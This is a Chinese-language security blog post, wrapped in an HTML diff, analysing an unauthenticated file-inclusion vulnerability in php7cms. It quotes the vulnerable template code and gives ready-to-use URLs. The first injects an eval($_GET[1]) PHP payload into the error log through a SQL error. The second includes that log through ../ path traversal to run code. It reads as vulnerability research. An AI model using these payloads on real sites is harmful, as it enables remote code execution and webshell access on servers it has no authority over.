@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="php7cms 文件包含漏洞利用思路 前台未授权文件包含 利用SQL注入报错插入payload到日志文件 包含该日志文件得到webshell  漏洞分析在php7cms&#x2F;Core&#x2F;Controllers&#x2F;Api&#x2F;Api.php:143 1234567public function template() &amp;#123;    ob_start();    \Phpcmf\Service::V()-&amp;g">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/php7cms/php7cms%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="php7cms 文件包含漏洞利用思路 前台未授权文件包含 利用SQL注入报错插入payload到日志文件 包含该日志文件得到webshell  漏洞分析在php7cms&#x2F;Core&#x2F;Controllers&#x2F;Api&#x2F;Api.php:143 1234567public function template() &amp;#123;    ob_start();    \Phpcmf\Service::V()-&amp;g">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:26:01.523Z">
+<meta property="article:modified_time" content="2022-07-08T09:06:16.904Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-php7cms/php7cms 文件包含漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/php7cms/php7cms%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:01.523Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="php7cms-文件包含漏洞"><a href="#php7cms-文件包含漏洞" class="headerlink" title="php7cms 文件包含漏洞"></a>php7cms 文件包含漏洞</h1><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ul>
+<li>前台未授权文件包含</li>
+<li>利用SQL注入报错插入payload到日志文件</li>
+<li>包含该日志文件得到webshell</li>
+</ul>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在<code>php7cms/Core/Controllers/Api/Api.php:143</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">template</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">V</span>()-&gt;<span class="title function_ invoke__">display</span>(<span class="title function_ invoke__">dr_safe_replace</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;Input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;name&#x27;</span>)));</span><br><span class="line">    <span class="variable">$html</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">    <span class="title function_ invoke__">ob_clean</span>();</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_jsonp</span>(<span class="number">1</span>, <span class="variable">$html</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该函数动态调用模板的函数，是可以通过构造url来访问到的。</p>
+<p>该函数接收一个参数name。并将该值带入到了display函数中，跟踪该函数。</p>
+<p><code>php7cms/Fcms/Core/View.php:137</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="variable">$_name</span>, <span class="variable">$_dir</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">       <span class="title function_ invoke__">extract</span>(<span class="variable">$this</span>-&gt;_options, EXTR_PREFIX_SAME, <span class="string">&#x27;data&#x27;</span>);</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;_filename = <span class="variable">$_name</span>;</span><br><span class="line">       !IS_DEV &amp;&amp; <span class="variable language_">$this</span>-&gt;_options = <span class="literal">null</span>;</span><br><span class="line">       <span class="comment">// 加载编译后的缓存文件</span></span><br><span class="line">       <span class="variable language_">$this</span>-&gt;_disp_dir = <span class="variable">$_dir</span>;</span><br><span class="line">       <span class="variable">$_view_file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_file_name</span>(<span class="variable">$_name</span>);</span><br><span class="line">       <span class="variable">$_view_name</span> = <span class="title function_ invoke__">str_replace</span>([TPLPATH, FCPATH, APPSPATH], <span class="string">&#x27;&#x27;</span>, <span class="variable">$_view_file</span>);</span><br><span class="line">       <span class="title class_">\Config\Services</span>::<span class="title function_ invoke__">timer</span>()-&gt;<span class="title function_ invoke__">start</span>(<span class="variable">$_view_name</span>);</span><br><span class="line">       <span class="keyword">include</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">load_view_file</span>(<span class="variable">$_view_file</span>);</span><br><span class="line">       <span class="title class_">\Config\Services</span>::<span class="title function_ invoke__">timer</span>()-&gt;<span class="title function_ invoke__">stop</span>(<span class="variable">$_view_name</span>);</span><br><span class="line">       <span class="comment">// 消毁变量</span></span><br><span class="line">       <span class="variable language_">$this</span>-&gt;_include_file = <span class="literal">null</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的$_name被带入到了<code>get_file_name</code>函数中。跟踪该函数:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_file_name</span>(<span class="params"><span class="variable">$file</span>, <span class="variable">$dir</span> = <span class="literal">null</span>, <span class="variable">$include</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$dir</span> = <span class="variable">$dir</span> ? <span class="variable">$dir</span> : <span class="variable language_">$this</span>-&gt;_disp_dir;</span><br><span class="line">        <span class="keyword">if</span> (IS_ADMIN || <span class="variable">$dir</span> == <span class="string">&#x27;admin&#x27;</span> || <span class="variable language_">$this</span>-&gt;_is_admin) &#123;</span><br><span class="line">            <span class="comment">// 后台操作时，不需要加载风格目录，如果文件不存在可以尝试调用主项目模板</span></span><br><span class="line">            <span class="keyword">if</span> (APP_DIR &amp;&amp; <span class="title function_ invoke__">is_file</span>(MYPATH.<span class="string">&#x27;View/&#x27;</span>.APP_DIR.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> MYPATH.<span class="string">&#x27;View/&#x27;</span>.APP_DIR.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file</span>;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (!APP_DIR &amp;&amp; <span class="title function_ invoke__">is_file</span>(MYPATH.<span class="string">&#x27;View/&#x27;</span>.<span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> MYPATH.<span class="string">&#x27;View/&#x27;</span>.<span class="variable">$file</span>;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;_dir.<span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_dir.<span class="variable">$file</span>; <span class="comment">// 调用当前后台的模板</span></span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;_aroot.<span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_aroot.<span class="variable">$file</span>; <span class="comment">// 当前项目目录模板不存在时调用主项目的</span></span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="variable">$dir</span> != <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="title function_ invoke__">is_file</span>(APPSPATH.<span class="title function_ invoke__">ucfirst</span>(<span class="variable">$dir</span>).<span class="string">&#x27;/Views/&#x27;</span>.<span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> APPSPATH.<span class="title function_ invoke__">ucfirst</span>(<span class="variable">$dir</span>).<span class="string">&#x27;/Views/&#x27;</span>.<span class="variable">$file</span>; <span class="comment">// 指定模块时调用模块下的文件</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$error</span> = <span class="variable language_">$this</span>-&gt;_dir.<span class="variable">$file</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (IS_MEMBER || <span class="variable">$dir</span> == <span class="string">&#x27;member&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// 会员操作时，需要加载风格目录，如果文件不存在可以尝试调用主项目模板</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$dir</span> === <span class="string">&#x27;/&#x27;</span> &amp;&amp; <span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;_root.<span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_root.<span class="variable">$file</span>;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;_dir.<span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="comment">// 调用当前的会员模块目录</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_dir.<span class="variable">$file</span>;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;_mroot.<span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="comment">// 调用默认的会员模块目录</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_mroot.<span class="variable">$file</span>;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;_root.<span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="comment">// 调用网站主站模块目录</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_root.<span class="variable">$file</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$error</span> = <span class="variable">$dir</span> === <span class="string">&#x27;/&#x27;</span> ? <span class="variable language_">$this</span>-&gt;_root.<span class="variable">$file</span> : <span class="variable language_">$this</span>-&gt;_dir.<span class="variable">$file</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$file</span> == <span class="string">&#x27;go&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// 转向字段模板</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_aroot.<span class="string">&#x27;go.html&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$dir</span> === <span class="string">&#x27;/&#x27;</span> &amp;&amp; <span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;_root.<span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="comment">// 强制主目录</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_root.<span class="variable">$file</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (@<span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;_dir.<span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="comment">// 调用本目录</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_dir.<span class="variable">$file</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (@<span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;_root.<span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="comment">// 再次调用主程序下的文件</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_root.<span class="variable">$file</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$error</span> = <span class="variable">$dir</span> === <span class="string">&#x27;/&#x27;</span> ? <span class="variable language_">$this</span>-&gt;_root.<span class="variable">$file</span> : <span class="variable language_">$this</span>-&gt;_dir.<span class="variable">$file</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果移动端模板不存在就调用主网站风格</span></span><br><span class="line">        <span class="keyword">if</span> (IS_MOBILE &amp;&amp; <span class="title function_ invoke__">is_file</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;/mobile/&#x27;</span>, <span class="string">&#x27;/pc/&#x27;</span>, <span class="variable">$error</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;/mobile/&#x27;</span>, <span class="string">&#x27;/pc/&#x27;</span>, <span class="variable">$error</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (IS_MOBILE &amp;&amp; <span class="title function_ invoke__">is_file</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;/mobile/&#x27;</span>, <span class="string">&#x27;/pc/&#x27;</span>, <span class="variable">$this</span>-&gt;_root.<span class="variable">$file</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;/mobile/&#x27;</span>, <span class="string">&#x27;/pc/&#x27;</span>, <span class="variable">$this</span>-&gt;_root.<span class="variable">$file</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$file</span> == <span class="string">&#x27;msg.html&#x27;</span> &amp;&amp; <span class="title function_ invoke__">is_file</span>(TPLPATH.<span class="string">&#x27;pc/default/home/msg.html&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> TPLPATH.<span class="string">&#x27;pc/default/home/msg.html&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;模板文件 (&#x27;</span>.<span class="title function_ invoke__">str_replace</span>(TPLPATH, <span class="string">&#x27;/&#x27;</span>, <span class="variable">$error</span>).<span class="string">&#x27;) 不存在&#x27;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>该函数是用来判断模板文件是否存在。由于文件名可控。导致我们可以通过../这样来跳转目录来使用其他我们可控的文件。</p>
+<p>然后判断完毕文件存在后，回到上文。</p>
+<p><code>include $this-&gt;load_view_file($_view_file);</code><br>这里将路径带入到了load_view_file函数中，并将返回结果include。看一下这个load_view_file函数:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load_view_file</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">      <span class="variable">$cache_file</span> = <span class="variable language_">$this</span>-&gt;_cache.<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(WEBPATH, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, DIRECTORY_SEPARATOR), <span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;_&#x27;</span>), <span class="variable">$name</span>).(IS_MOBILE ? <span class="string">&#x27;.mobile.&#x27;</span> : <span class="string">&#x27;&#x27;</span>).<span class="string">&#x27;.cache.php&#x27;</span>;</span><br><span class="line">      <span class="comment">// 当缓存文件不存在时或者缓存文件创建时间少于了模板文件时,再重新生成缓存文件</span></span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$cache_file</span>) || (<span class="title function_ invoke__">is_file</span>(<span class="variable">$cache_file</span>) &amp;&amp; <span class="title function_ invoke__">is_file</span>(<span class="variable">$name</span>) &amp;&amp; <span class="title function_ invoke__">filemtime</span>(<span class="variable">$cache_file</span>) &lt; <span class="title function_ invoke__">filemtime</span>(<span class="variable">$name</span>))) &#123;</span><br><span class="line">          <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">handle_view_file</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$name</span>));</span><br><span class="line">          @<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$cache_file</span>, <span class="variable">$content</span>, LOCK_EX) === <span class="literal">FALSE</span> &amp;&amp; <span class="title function_ invoke__">show_error</span>(<span class="string">&#x27;请将模板缓存目录（/cache/template/）权限设为777&#x27;</span>, <span class="number">404</span>, <span class="string">&#x27;无写入权限&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$cache_file</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里会将我们传入的文件路径的文件内容写入到缓存文件中，并返回该缓存文件的文件路径。</p>
+<p>文件包含的点在这里，那么如何找到可控内容的文件就比较重要的。</p>
+<p>这里我使用该网站自带的错误日志来进行包含。</p>
+<p>首先我们访问：<code>http://localhost/index.php?s=news&amp;c=search&amp;keyword=%E5%9B%BA%E5%AE%9A&amp;order=2%3C?=/*&amp;sss=*/e val($_GET[1]);</code></p>
+<p>这样就会生成一个错误日志<code>cache/error/log-2018-10-20.php</code></p>
+<p>命名规则就是log-年-月-日.php</p>
+<p>看一下这个文件的内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">defined</span>(<span class="string">&#x27;B ASEPATH&#x27;</span>) OR <span class="keyword">exit</span>(<span class="string">&#x27;No direct s cript access allowed&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">ERROR - <span class="number">2018</span>-<span class="number">10</span>-<span class="number">20</span> <span class="number">16</span>:<span class="number">53</span>:<span class="number">04</span> --&gt; You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version <span class="keyword">for</span> the right syntax to <span class="keyword">use</span> <span class="title">near</span> &#x27;?=/* <span class="title">LIMIT</span> 0,10&#x27; <span class="title">at</span> <span class="title">line</span> 1&lt;<span class="title">br</span>&gt;<span class="title">SELECT</span> `<span class="title">dr_1_news</span>`.`<span class="title">thumb</span>`,`<span class="title">dr_1_news</span>`.`<span class="title">url</span>`,`<span class="title">dr_1_news</span>`.`<span class="title">title</span>`,`<span class="title">dr_1_news</span>`.`<span class="title">des</span> <span class="title">cription</span>`,`<span class="title">dr_1_news</span>`.`<span class="title">keywords</span>`,`<span class="title">dr_1_news</span>`.`<span class="title">updatetime</span>`,`<span class="title">dr_1_news</span>`.`<span class="title">hits</span>`,`<span class="title">dr_1_news</span>`.`<span class="title">comments</span>` <span class="title">FROM</span> `<span class="title">dr_1_news</span>` <span class="title">WHERE</span> (`<span class="title">dr_1_news</span>`.`<span class="title">id</span>` <span class="title">IN</span>(<span class="title">SELECT</span> `<span class="title">cid</span>` <span class="title">FROM</span> `<span class="title">dr_1_news_search_index</span>` <span class="title">WHERE</span> `<span class="title">id</span>`=&quot;<span class="title">ce0f2ef8f63c9afa7453492781553547</span>&quot;)) <span class="title">AND</span> `<span class="title">dr_1_news</span>`.`<span class="title">status</span>` = 9 <span class="title">ORDER</span> <span class="title">BY</span> 2&lt;?=/* <span class="title">LIMIT</span> 0,10&lt;<span class="title">br</span>&gt;<span class="title">http</span>://<span class="title">localhost</span>/<span class="title">index</span>.<span class="title">php</span>?<span class="title">s</span>=<span class="title">news</span>&amp;<span class="title">c</span>=<span class="title">search</span>&amp;<span class="title">keyword</span>=%<span class="title">E5</span>%9<span class="title">B</span>%<span class="title">BA</span>%<span class="title">E5</span>%<span class="title">AE</span>%9<span class="title">A</span>&amp;<span class="title">order</span>=2%3<span class="title">C</span>?=/*&amp;<span class="title">sss</span>=*/<span class="title">e</span> <span class="title">val</span>($<span class="title">_GET</span>[1]);</span><br></pre></td></tr></table></figure>
+
+<p>因为程序对&lt;?php这种有过滤，所以这里采用短标签+注释符来执行代码。</p>
+<p>然后我们将这个日志文件包含进来。</p>
+<p>访问如下url。</p>
+<p><code>http://10.3.0.22/index.php?s=api&amp;c=api&amp;m=template&amp;name=../../../../cache/error/log-2020-09-30.php&amp;1=phpinfo();</code></p>
+<p>即可执行phpinfo</p>
+<p>![](/resource/php7cms文件包含漏洞/media/1.png)</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/php7cms/php7cms%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qu0u00doy8v1a78m5uhg" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/PhpBB/%EF%BC%88CVE-2018-19274%EF%BC%89PhpBB%20Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Php/Php%20screw%E5%8A%A0%E5%AF%86%E4%B8%8E%E7%A0%B4%E8%A7%A3/%EF%BC%88%E5%9B%9B%EF%BC%89php-screw%E5%8A%A0%E5%AF%86%E6%96%87%E4%BB%B6/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
